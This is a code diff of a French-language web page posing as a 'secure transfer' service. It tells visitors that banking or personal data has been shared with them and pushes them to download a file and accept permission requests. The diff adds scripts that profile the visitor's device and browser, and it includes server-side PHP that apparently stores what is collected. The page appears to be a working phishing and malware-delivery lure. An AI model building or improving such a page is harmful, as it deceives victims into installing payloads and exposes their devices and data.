@@ -18,10 +18,11 @@
             <h1>Transfert Sécurisé</h1>
         </div>
         <p>Des données <span>bancaires ou personnelles</span> ont été partagées avec vous via notre application sécurisée.</p>
-        <a class="btn" href="" download="" target="_blank">Ouvrez le fichier et acceptez les demandes d’autorisation pour les voir</a>
+        <a class="btn" href="" download="" >Ouvrez le fichier et acceptez les demandes d’autorisation pour les voir</a>
     </div>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/userinfo/1.1.0/userinfo.min.js"></script>
     <script type='text/javascript' src="//wurfl.io/wurfl.js"></script>
-    <script type="text/javascript" src="https://unpkg.com/platform@1.3.6/platform.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js" integrity="sha512-STof4xm1wgkfm7heWqFJVn58Hm3EtS31XFaagaa8VMReCXAkQnJZ+jEy8PCC/iT18dFy95WcExNHFTqLyp72eQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <?php include 'store.php'; ?>
     <script src="./main.js"></script>
